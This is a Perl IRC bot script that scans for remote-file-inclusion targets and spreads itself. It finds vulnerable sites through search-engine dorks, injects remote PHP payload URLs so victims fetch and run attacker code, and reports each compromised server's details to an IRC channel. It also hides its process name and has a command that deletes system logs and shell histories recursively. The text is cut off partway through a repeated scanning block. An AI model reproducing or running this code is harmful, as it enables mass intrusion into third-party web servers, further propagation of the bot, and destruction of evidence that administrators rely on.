#!/usr/bin/perl          ## Romania  ##
# Priv8 scanner by ubitu ## Romania  ##
# Owned by Romanian Hackers   ##


$process   = "/usr/sbin/local/httpdssl";
my $command     = "!scan";
my $irccmd  = "http://www.rupkalwis.com/includes/r.txt???";
my $spread    = "http://www.ggps.ptc.edu.tw/help/spr.txt???";
my $id = "http://www.ggps.ptc.edu.tw/help/i.txt???";
my $ircserver = "irc.indoirc.net";
my $port      = "6667";
my $nickname  = "[S]TeaM[".int(rand(1000))."]";
my $channel   = "#SteaMr00t";
my $admin = "ZeroBoss";


use IO::Socket::INET;
use HTTP::Request;
use LWP::UserAgent;
require LWP;
$|++;

my $pid = fork;
exit if $pid;
$0 = "$process" . "\0" x 16;
my $dsp = IO::Socket::INET->new(
    PeerAddr => "$ircserver",
    PeerPort => "$port",
    Proto    => "tcp"
) or die "Eroare la conectarea la server!\n";
$dsp->autoflush(1);
print $dsp "NICK $nickname\r\n";
print $dsp "USER petology 8 *  : By petology \r\n";
print $dsp "JOIN $channel\r\n";
print $dsp "PRIVMSG $channel :4,19Priv8 scanner by 4petology9 -- Priv8!! Priv8!! Priv8!! -- !! \r\n";
sleep(1);

while ( $line = <$dsp> ) {

    $line =~ s/\r\n$//;
    if ( $line =~ /^PING \:(.*)/ ) {
 print "PONG :$1";
 print $dsp "PONG :$1";
    }

    if ( $line =~ /PRIVMSG $channel :!xp/ )
    {
 my $verifica = $id;
 my $req    = HTTP::Request->new( GET => $verifica );
 my $ua     = LWP::UserAgent->new();
 $ua->timeout(5);
 my $response = $ua->request($req);
 if ( $response->is_success ) {
     my $re = $response->content;
     if ( $re =~ /<\?php/ ) {
  sleep(1);
  display( $dsp, "PRIVMSG $channel :12yeah baby i'm still HOT");
     }
 }
 else {
     sleep(1);
     display( $dsp, "PRIVMSG $channel :12Coglione non hai l'id funzionante!");
     sleep(1);
     display( $dsp, "PRIVMSG $channel :12(id) 4E' inutile continuare.. Ciao.. !" );
     display( $dsp, "QUIT" );
 }
    }

    if ( $line =~ /PRIVMSG $channel :!help/ ) {
 sleep(3);
 display( $dsp, "PRIVMSG $channel :4,19Per scannare RFI usa 4!scan bug dork");
 display( $dsp, "PRIVMSG $channel :4,19Per la lista rfi usa 4!listarfi");
 display( $dsp, "PRIVMSG $channel :4,19Per tutte le informazioni sullo shellbot usa 4!info");
 display( $dsp, "PRIVMSG $channel :4,19Per pulire i log della shell usa 4!log");
 display( $dsp, "PRIVMSG $channel :4,19Per le informazioni sulla shell usa4!system");
 display( $dsp, "PRIVMSG $channel :4,19Per le ultime vulnerabilit? milw0rm usa 4!milw0rm");
    }



    if ( $line =~ /PRIVMSG $channel :!list/ ) {
 sleep(1);
 display( $dsp, "PRIVMSG $channel :4,19Puoi trovare una lista di bug rfi su http://crashoveride.altervista.org/rfi_list.txt ");
    }
	
	if ( $line =~ /PRIVMSG $channel :!info/ ) {
 sleep(1);
 display( $dsp, "PRIVMSG $channel :4,19 Shellbot Coded by petology ");
 display( $dsp, "PRIVMSG $channel :4,19 Priv8 ! Priv8 ! Priv8 ! Priv8 ! ");
 display( $dsp, "PRIVMSG $channel :4,19 Creato in Aprile 2008  ");
 display( $dsp, "PRIVMSG $channel :4,19 Italian Coder r0x ");
 display( $dsp, "PRIVMSG $channel :4,19 Per tutte le informazioni /q crashoveride");
    }

if ( $line =~ /PRIVMSG $channel :!lfi\s+(.*?)\s+(.*)/){ 
    if(fork() == 0){ 
        my($bug,$dork)=($1,$2); 
        &lfi($bug,$dork); 
            exit(0); 
    } 
} 

if ($line =~ /PRIVMSG $channel :!system/) {
				$uname=`uname -a`;
				$uptime=`uptime`;
				$distro=`cat /etc/issue`;
				$id=`id`;
				 display( $dsp, "PRIVMSG $channel :4|12.:4System Info12:.4|12 Info    : 7 $uname");
				 display( $dsp, "PRIVMSG $channel :4|12.:4System Info12:.4|12 Uptime  : 7 $uptime");
				 display( $dsp, "PRIVMSG $channel :4|12.:4System Info12:.4|12 Proc.   : 7 $processo");
				 display( $dsp, "PRIVMSG $channel :4|12.:4System Info12:.4|12 ID      : 7 $id");
				 display( $dsp, "PRIVMSG $channel :4|12.:4System Info12:.4|12 OS      : 7 $distro");
   }

if ($line =~ /PRIVMSG $channel :!milw0rm/) {
				my @ltt=();
				my @bug=();
				my $x;
				my $page='';
				my $socke = IO::Socket::INET->new(PeerAddr=>"milw0rm.com",PeerPort=>"80",Proto=>"tcp") or return;
				print $socke "GET http://milw0rm.com/rss.php HTTP/1.0\r\nHost: milw0rm.com\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
				my @r = <$socke>;
				$page="@r";
				close($socke);
				while ($page =~  m/<title>(.*)</g){
					$x = $1;
					if ($x =~ /\&lt\;/) {
						$x =~ s/\&lt\;/</g;
					}			
					if ($x !~ /milw0rm/) {
						push (@bug,$x);
					}
				}
				while ($page =~  m/<link.*expl.*([0-9]...)</g) {
					if ($1 !~ m/milw0rm.com|exploits|en/){
						push (@ltt,"http://www.milw0rm.com/exploits/$1 ");
					}
				}
				 display( $dsp, "PRIVMSG $channel :4|12.:9milw0rm12:.4|12 Latest exploits :");
				foreach $x (0..(@ltt - 1)) {
					 display( $dsp, "PRIVMSG $channel :4|12.:9milw0rm12:.4|12  $bug[$x] - $ltt[$x]");
					sleep 1;
				}	}

   if($line =~ /\!killa/){
 display( $dsp, "PRIVMSG $channel :4,19Priv8 bot by petology --..Ciao.. -- ");
 sleep(1);
 display( $dsp, "Quit");
    }

if ($line =~ /PRIVMSG $channel :!log/) {
				display( $dsp, "PRIVMSG $channel :4|12.:4Log Cleaner12:.4| 12 Questo processo puo essere lungo.. aspetta.."); 
				system 'rm -rf /var/log/lastlog';
				system 'rm -rf /var/log/wtmp';
				system 'rm -rf /etc/wtmp';
				system 'rm -rf /var/run/utmp';
				system 'rm -rf /etc/utmp';
				system 'rm -rf /var/log';
				system 'rm -rf /var/logs';
				system 'rm -rf /var/adm';
				system 'rm -rf /var/apache/log';
				system 'rm -rf /var/apache/logs';
				system 'rm -rf /usr/local/apache/log'; 
				system 'rm -rf /usr/local/apache/logs';
				system 'rm -rf /root/.bash_history';
				system 'rm -rf /root/.ksh_history';
				display( $dsp, "PRIVMSG $channel :12(7@2LogCleaner12) Tutti i log di default e i files di bash_history cancellati..."); 
				sleep 2;
				display( $dsp, "PRIVMSG $channel :12(7@2LogCleaner12) Adesso elimino il resto dei log della macchina...");
				system 'find / -name *.bash_history -exec rm -rf {} \;';
				system 'find / -name *.bash_logout -exec rm -rf {} \;';
				system 'find / -name "log*" -exec rm -rf {} \;';
				system 'find / -name *.log -exec rm -rf {} \;';
				sleep 2;
				display( $dsp, "PRIVMSG $channel :12(7@2LogCleaner12) Fatto!! TUTTI i logs cancellati!!!"); 
			}


if ( $line =~ /PRIVMSG $channel :$command\s+(.*?)\s+(.*)/ ) {
 if ( my $pid = fork ) {
     waitpid( $pid, 0 );
 }
 else {
     if (fork) {
  exit;
     }
     else {
  my $bug= $1;
  my $dork      = $2;
  my $contatore = 0;
  my %hosts;
  sleep(1);
  display( $dsp, "PRIVMSG $channel :4,14?8?12? Iniziamo a scannare con $dork 4?8?12?");
  my @google = &googlet($dork);
  push( my @tot, @google );
  my @puliti = &unici(@tot);
  display( $dsp, "PRIVMSG $channel 4,14?8?12? GOOGLE  9 ".scalar(@tot)." puliti ".scalar(@puliti)." con 4 $dork" );
  my $uni = scalar(@puliti);

  foreach my $site (@puliti) {
      $contatore++;
      if ( $contatore % 100 == 0 ) {
      }
      if ( $contatore == $uni - 1 ) {
   display( $dsp, "PRIVMSG $channel :4,14?8?12? GOOGLE ha terminato di scannare.. sto exploitando/spreadando su $dork");
      }
my $test  = "http://".$site.$bug.$id."?";
my $print = "http://".$site.$bug.$irccmd."?";
my $req   = HTTP::Request->new( GET => $test );
my $ua    = LWP::UserAgent->new();
$ua->timeout(5);
my $response = $ua->request($req);
if ( $response->is_success ) {
my $re = $response->content;
if ( $re =~ /Osirys/ && $re =~ /uid=/ ) {
my $hs = geths($print);
$hosts{$hs}++;
if ( $hosts{$hs} == "1" ) {
$x = os($test);
( $type, $space ) = split( /\,/, $x );
sleep(4);
display( $dsp, "PRIVMSG $channel :4?8?12? Google 4?8?12?");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Version9 $Os 12: SafeMode 8OFF 12:9 $print ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uname:9 $un ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Id:9 $id1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uptime:9 $up ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Space: Total:9 $all 12Free:9 $free 12Used:9 $used ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Director:9 $pwd1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Addr:9 $ip1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Server Name:9 $name1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Software:9 $php1 ");
display( $dsp, "PRIVMSG $admin   :4?8?12? 12,1Version9 $Os 12: SafeMode 8OFF 12:9 $print ");

my $test2 =
"http://" . $site . $bug . $spread . "?";
my $reqz = HTTP::Request->new( GET => $test2 );
my $ua = LWP::UserAgent->new();
my $response = $ua->request($reqz);

}
   }
   elsif ( $re =~ /Osirys/ ) {
my $hs = geths($print);
$hosts{$hs}++;
if ( $hosts{$hs} == "1" ) {
$x = os($test);
 ( $type, $space ) = split( /\,/, $x );
sleep(4);
display( $dsp, "PRIVMSG $channel :4?8?12? Google 4?8?12?");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Version9 $Os 12: SafeMode 4ON 12:9 $print ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uname:9 $un ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Id:9 $id1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uptime:9 $up ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Space: Total:9 $all 12Free:9 $free 12Used:9 $used ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Director:9 $pwd1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Addr:9 $ip1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Server Name:9 $name1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Software:9 $php1 ");
display( $dsp, "PRIVMSG $admin   :4?8?12? 12,1Version9 $Os 12: SafeMode 8ON 12:9 $print ");

}
   }
      }
  }
     }
     exit;
 }
    }

    if ( $line =~ /PRIVMSG $channel :$command\s+(.*?)\s+(.*)/ ) {
 if ( my $pid = fork ) {
     waitpid( $pid, 0 );
 }
 else {
     if (fork) {
  exit;
     }
     else {
  my $bug= $1;
  my $dork      = $2;
  my $contatore = 0;
  my %hosts;
  my @alltheweb = &alltheweb($dork);
  push( my @tot, @alltheweb );
  my @puliti = &unici(@tot);
  display( $dsp, "PRIVMSG $channel 4,14?8?12? ALLTHEWEB 9 ".scalar(@tot)." puliti ".scalar(@puliti)." con 4 $dork");
  my $uni = scalar(@puliti);

  foreach my $site (@puliti) {
      $contatore++;
      if ( $contatore % 100 == 0 ) {
      }
      if ( $contatore == $uni - 1 ) {
   display( $dsp, "PRIVMSG $channel :4,14?8?12? AllTheWeb ha terminato di scannare .. sto exploitando/spreadando su  $dork");
      }
my $test  = "http://".$site.$bug.$id."?";
my $print = "http://".$site.$bug.$irccmd."?";
      my $req   = HTTP::Request->new( GET => $test );
      my $ua    = LWP::UserAgent->new();
      $ua->timeout(5);
      my $response = $ua->request($req);
      if ( $response->is_success ) {
   my $re = $response->content;
   if ( $re =~ /Osirys/ && $re =~ /uid=/ ) {
my $hs = geths($print);
$hosts{$hs}++;
if ( $hosts{$hs} == "1" ) {
$x = os($test);
 ( $type, $space ) = split( /\,/, $x );
sleep(4);
display( $dsp, "PRIVMSG $channel :4?8?12? AllTheWeb 4?8?12?");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Version9 $Os 12: SafeMode 8OFF 12:9 $print ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uname:9 $un ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Id:9 $id1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uptime:9 $up ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Space: Total:9 $all 12Free:9 $free 12Used:9 $used ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Director:9 $pwd1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Addr:9 $ip1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Server Name:9 $name1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Software:9 $php1 ");
display( $dsp, "PRIVMSG $admin   :4?8?12? 12,1Version9 $Os 12: SafeMode 8OFF 12:9 $print ");

my $test2 =
"http://" . $site . $bug . $spread . "?";
my $reqz = HTTP::Request->new( GET => $test2 );
my $ua = LWP::UserAgent->new();
my $response = $ua->request($reqz);

}
   }
   elsif ( $re =~ /Osirys/ ) {
my $hs = geths($print);
$hosts{$hs}++;
if ( $hosts{$hs} == "1" ) {
$x = os($test);
 ( $type, $space ) = split( /\,/, $x );
sleep(4);
display( $dsp, "PRIVMSG $channel :4?8?12? AllTheWeb 4?8?12?");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Version9 $Os 12: SafeMode 4ON 12:9 $print ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uname:9 $un ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Id:9 $id1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uptime:9 $up ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Space: Total:9 $all 12Free:9 $free 12Used:9 $used ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Director:9 $pwd1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Addr:9 $ip1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Server Name:9 $name1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Software:9 $php1 ");
display( $dsp, "PRIVMSG $admin   :4?8?12? 12,1Version9 $Os 12: SafeMode 8ON 12:9 $print ");

}
   }
      }
  }
     }
     exit;
 }
    }

    if ( $line =~ /PRIVMSG $channel :$command\s+(.*?)\s+(.*)/ ) {
 if ( my $pid = fork ) {
     waitpid( $pid, 0 );
 }
 else {
     if (fork) {
  exit;
     }
     else {
  my $bug= $1;
  my $dork      = $2;
  my $contatore = 0;
  my %hosts;
  my @uol = &uolsub($dork);
  push( my @tot, @uol );
  my @puliti = &unici(@tot);
  display( $dsp, "PRIVMSG $channel 4,14?8?12? UOL 9 ".scalar(@tot)." puliti ".scalar(@puliti)." con 4 $dork " );
  my $uni = scalar(@puliti);

  foreach my $site (@puliti) {
      $contatore++;
      if ( $contatore % 100 == 0 ) {
      }
      if ( $contatore == $uni - 1 ) {
   display( $dsp, "PRIVMSG $channel :4,14?8?12? UOL ha terminato di scannare .. sto exploitando/spreadando su  $dork");
      }
my $test  = "http://".$site.$bug.$id."?";
my $print = "http://".$site.$bug.$irccmd."?";
      my $req   = HTTP::Request->new( GET => $test );
      my $ua    = LWP::UserAgent->new();
      $ua->timeout(5);
      my $response = $ua->request($req);
      if ( $response->is_success ) {
   my $re = $response->content;
   if ( $re =~ /Osirys/ && $re =~ /uid=/ ) {
my $hs = geths($print);
$hosts{$hs}++;
if ( $hosts{$hs} == "1" ) {
$x = os($test);
 ( $type, $space ) = split( /\,/, $x );
sleep(4);
display( $dsp, "PRIVMSG $channel :4?8?12? UOL 4?8?12?");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Version9 $Os 12: SafeMode 8OFF 12:9 $print ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uname:9 $un ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Id:9 $id1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uptime:9 $up ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Space: Total:9 $all 12Free:9 $free 12Used:9 $used ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Director:9 $pwd1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Addr:9 $ip1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Server Name:9 $name1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Software:9 $php1 ");
display( $dsp, "PRIVMSG $admin   :4?8?12? 12,1Version9 $Os 12: SafeMode 8ON 12:9 $print ");

my $test2 =
"http://" . $site . $bug . $spread . "?";
my $reqz = HTTP::Request->new( GET => $test2 );
my $ua = LWP::UserAgent->new();
my $response = $ua->request($reqz);

}
   }
   elsif ( $re =~ /Osirys/ ) {
my $hs = geths($print);
$hosts{$hs}++;
if ( $hosts{$hs} == "1" ) {
$x = os($test);
 ( $type, $space ) = split( /\,/, $x );
sleep(4);
display( $dsp, "PRIVMSG $channel :4?8?12? UOL 4?8?12?");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Version9 $Os 12: SafeMode 4ON 12:9 $print ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uname:9 $un ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Id:9 $id1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uptime:9 $up ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Space: Total:9 $all 12Free:9 $free 12Used:9 $used ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Director:9 $pwd1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Addr:9 $ip1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Server Name:9 $name1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Software:9 $php1 ");
display( $dsp, "PRIVMSG $admin   :4?8?12? 12,1Version9 $Os 12: SafeMode 8ON 12:9 $print ");

}
   }
      }
  }
     }
     exit;
 }
    }


  if ( $line =~ /PRIVMSG $channel :$command\s+(.*?)\s+(.*)/ ) {
 if ( my $pid = fork ) {
     waitpid( $pid, 0 );
 }
 else {
     if (fork) {
  exit;
     }
     else {
  my $bug= $1;
  my $dork      = $2;
  my $contatore = 0;
  my %hosts;
  my @altavistaitl = &altavistait($dork);
  push( my @tot, @altavistaitl);
  my @puliti = &unici(@tot);
  display( $dsp, "PRIVMSG $channel 4,14?8?12? Altavista IT  ".scalar(@tot)." puliti ".scalar(@puliti)." con $dork" );
  my $uni = scalar(@puliti);

  foreach my $site (@puliti) {
      $contatore++;
      if ( $contatore % 100 == 0 ) {
      }
      if ( $contatore == $uni - 1 ) {
   display( $dsp, "PRIVMSG $channel :4,14?8?12? Altavista  IT ha terminato di scannare .. sto exploitando/spreadando su  $dork");
      }
my $test  = "http://".$site.$bug.$id."?";
my $print = "http://".$site.$bug.$irccmd."?";
      my $req   = HTTP::Request->new( GET => $test );
      my $ua    = LWP::UserAgent->new();
      $ua->timeout(5);
      my $response = $ua->request($req);
      if ( $response->is_success ) {
   my $re = $response->content;
   if ( $re =~ /Osirys/ && $re =~ /uid=/ ) {
my $hs = geths($print);
$hosts{$hs}++;
if ( $hosts{$hs} == "1" ) {
$x = os($test);
 ( $type, $space ) = split( /\,/, $x );
sleep(4);
display( $dsp, "PRIVMSG $channel :12,1Altavista IT");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Version9 $Os 12: SafeMode 8OFF 12:9 $print ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uname:9 $un ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Id:9 $id1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uptime:9 $up ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Space: Total:9 $all 12Free:9 $free 12Used:9 $used ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Director:9 $pwd1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Addr:9 $ip1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Server Name:9 $name1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Software:9 $php1 ");
display( $dsp, "PRIVMSG $admin   :4?8?12? 12,1Version9 $Os 12: SafeMode 8OFF 12:9 $print ");

my $test2 =
"http://" . $site . $bug . $spread . "?";
my $reqz = HTTP::Request->new( GET => $test2 );
my $ua = LWP::UserAgent->new();
my $response = $ua->request($reqz);

}
   }
   elsif ( $re =~ /Osirys/ ) {
my $hs = geths($print);
$hosts{$hs}++;
if ( $hosts{$hs} == "1" ) {
$x = os($test);
 ( $type, $space ) = split( /\,/, $x );
sleep(4);
display( $dsp, "PRIVMSG $channel :4,1Altavista IT ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Version9 $Os 12: SafeMode 4ON 12:9 $print ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uname:9 $un ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Id:9 $id1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uptime:9 $up ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Space: Total:9 $all 12Free:9 $free 12Used:9 $used ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Director:9 $pwd1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Addr:9 $ip1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Server Name:9 $name1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Software:9 $php1 ");;
display( $dsp, "PRIVMSG $admin   :4?8?12? 12,1Version9 $Os 12: SafeMode 8ON 12:9 $print ");

}
   }
      }
  }
     }
     exit;
 }
    }

     if ( $line =~ /PRIVMSG $channel :$command\s+(.*?)\s+(.*)/ ) {
 if ( my $pid = fork ) {
     waitpid( $pid, 0 );
 }
 else {
     if (fork) {
  exit;
     }
     else {
  my $bug= $1;
  my $dork      = $2;
  my $contatore = 0;
  my %hosts;
  my @asklist = &ask($dork);
  push( my @tot, @asklist );
  my @puliti = &unici(@tot);
  display( $dsp, "PRIVMSG $channel 4,14?8?12? ASK  ".scalar(@tot)." puliti ".scalar(@puliti)." con $dork" );
  my $uni = scalar(@puliti);

  foreach my $site (@puliti) {
      $contatore++;
      if ( $contatore % 100 == 0 ) {
      }
      if ( $contatore == $uni - 1 ) {
   display( $dsp, "PRIVMSG $channel :4,14?8?12? ASK ha terminato di scannare .. sto exploitando/spreadando su  $dork");
      }
my $test  = "http://".$site.$bug.$id."?";
my $print = "http://".$site.$bug.$irccmd."?";
      my $req   = HTTP::Request->new( GET => $test );
      my $ua    = LWP::UserAgent->new();
      $ua->timeout(5);
      my $response = $ua->request($req);
      if ( $response->is_success ) {
   my $re = $response->content;
   if ( $re =~ /Osirys/ && $re =~ /uid=/ ) {
my $hs = geths($print);
$hosts{$hs}++;
if ( $hosts{$hs} == "1" ) {
$x = os($test);
 ( $type, $space ) = split( /\,/, $x );
sleep(4);
display( $dsp, "PRIVMSG $channel :4,1ASK");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Version9 $Os 12: SafeMode 8OFF 12:9 $print ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uname:9 $un ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Id:9 $id1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uptime:9 $up ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Space: Total:9 $all 12Free:9 $free 12Used:9 $used ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Director:9 $pwd1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Addr:9 $ip1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Server Name:9 $name1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Software:9 $php1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Software:9 $php1 ");
display( $dsp, "PRIVMSG $admin   :4?8?12? 12,1Version9 $Os 12: SafeMode 8OFF 12:9 $print ");

my $test2 =
"http://" . $site . $bug . $spread . "?";
my $reqz = HTTP::Request->new( GET => $test2 );
my $ua = LWP::UserAgent->new();
my $response = $ua->request($reqz);

}
   }
   elsif ( $re =~ /Osirys/ ) {
my $hs = geths($print);
$hosts{$hs}++;
if ( $hosts{$hs} == "1" ) {
$x = os($test);
 ( $type, $space ) = split( /\,/, $x );
sleep(4);
display( $dsp, "PRIVMSG $channel :4,1ASK");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Version9 $Os 12: SafeMode 4ON 12:9 $print ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uname:9 $un ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Id:9 $id1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uptime:9 $up ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Space: Total:9 $all 12Free:9 $free 12Used:9 $used ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Director:9 $pwd1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Addr:9 $ip1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Server Name:9 $name1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Software:9 $php1 ");
display( $dsp, "PRIVMSG $admin   :4?8?12? 12,1Version9 $Os 12: SafeMode 8ON 12:9 $print ");

}
   }
      }
  }
     }
     exit;
 }
    }

    if ( $line =~ /PRIVMSG $channel :$command\s+(.*?)\s+(.*)/ ) {
 if ( my $pid = fork ) {
     waitpid( $pid, 0 );
 }
 else {
     if (fork) {
  exit;
     }
     else {
  my $bug= $1;
  my $dork      = $2;
  my $contatore = 0;
  my %hosts;
my @mlist = &msn($dork);
  push( my @tot, @mlist );
  my @puliti = &unici(@tot);
  display( $dsp, "PRIVMSG $channel 4,14?8?12? MSN  99 ".scalar(@tot)." puliti ".scalar(@puliti)." con 4 $dork" );
  my $uni = scalar(@puliti);

  foreach my $site (@puliti) {
      $contatore++;
      if ( $contatore % 100 == 0 ) {
      }
      if ( $contatore == $uni - 1 ) {
   display( $dsp, "PRIVMSG $channel :4,14?8?12? MSN ha terminato di scannare .. sto exploitando/spreadando su  $dork");
      }
my $test  = "http://".$site.$bug.$id."?";
my $print = "http://".$site.$bug.$irccmd."?";
      my $req   = HTTP::Request->new( GET => $test );
      my $ua    = LWP::UserAgent->new();
      $ua->timeout(5);
      my $response = $ua->request($req);
      if ( $response->is_success ) {
   my $re = $response->content;
   if ( $re =~ /Osirys/ && $re =~ /uid=/ ) {
my $hs = geths($print);
$hosts{$hs}++;
if ( $hosts{$hs} == "1" ) {
$x = os($test);
 ( $type, $space ) = split( /\,/, $x );
sleep(4);
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Version9 $Os 12: SafeMode 8OFF 12:9 $print ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uname:9 $un ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Id:9 $id1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uptime:9 $up ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Space: Total:9 $all 12Free:9 $free 12Used:9 $used ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Director:9 $pwd1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Addr:9 $ip1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Server Name:9 $name1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Software:9 $php1 ");
display( $dsp, "PRIVMSG $admin   :4?8?12? 12,1Version9 $Os 12: SafeMode 8OFF 12:9 $print ");

my $test2 =
"http://" . $site . $bug . $spread . "?";
my $reqz = HTTP::Request->new( GET => $test2 );
my $ua = LWP::UserAgent->new();
my $response = $ua->request($reqz);

}
   }
   elsif ( $re =~ /Osirys/ ) {
my $hs = geths($print);
$hosts{$hs}++;
if ( $hosts{$hs} == "1" ) {
$x = os($test);
 ( $type, $space ) = split( /\,/, $x );
sleep(4);
display( $dsp, "PRIVMSG $channel :4,1MSN");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Version9 $Os 12: SafeMode 4ON 12:9 $print ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uname:9 $un ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Id:9 $id1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uptime:9 $up ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Space: Total:9 $all 12Free:9 $free 12Used:9 $used ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Director:9 $pwd1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Addr:9 $ip1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Server Name:9 $name1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Software:9 $php1 ");
display( $dsp, "PRIVMSG $admin   :4?8?12? 12,1Version9 $Os 12: SafeMode 8ON 12:9 $print ");

}
   }
      }
  }
     }
     exit;
 }
    }


    if ( $line =~ /PRIVMSG $channel :$command\s+(.*?)\s+(.*)/ ) {
 if ( my $pid = fork ) {
     waitpid( $pid, 0 );
 }
 else {
     if (fork) {
  exit;
     }
     else {
  my $bug= $1;
  my $dork      = $2;
  my $contatore = 0;
  my %hosts;
my @mlist = &msn2($dork);
  push( my @tot, @mlist );
  my @puliti = &unici(@tot);
